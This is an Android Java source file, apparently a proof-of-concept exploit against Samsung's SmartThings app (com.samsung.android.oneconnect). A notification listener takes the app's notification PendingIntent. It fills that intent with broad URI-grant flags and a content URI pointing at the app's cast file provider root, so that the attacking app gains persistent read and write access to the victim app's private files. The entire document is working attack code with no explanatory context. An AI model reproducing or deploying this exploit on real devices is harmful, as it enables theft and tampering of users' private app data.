package poc.app;

import android.app.PendingIntent;
import android.content.ClipData;
import android.content.Intent;
import android.net.Uri;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotificationListener extends NotificationListenerService {
    private static final String APP = "com.samsung.android.oneconnect";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn, NotificationListenerService.RankingMap rankingMap) {
        if (!APP.equals(sbn.getPackageName())) {
            return;
        }
        PendingIntent contentIntent = sbn.getNotification().contentIntent;
        if (contentIntent == null) {
            return;
        }
        try {
            Intent fillin = new Intent();
            fillin.setPackage(getPackageName());
            fillin.addCategory("smth");
            fillin.setClipData(getClipData());
            fillin.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
                    | Intent.FLAG_GRANT_WRITE_URI_PERMISSION
                    | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
                    | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);
            contentIntent.send(this, 0, fillin);
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }

    private ClipData getClipData() {
        Uri uri = Uri.parse("content://com.samsung.android.oneconnect.castfileprovider/root/data/user/0/com.samsung.android.oneconnect/test.txt");
        return ClipData.newRawUri("", uri);
    }
}
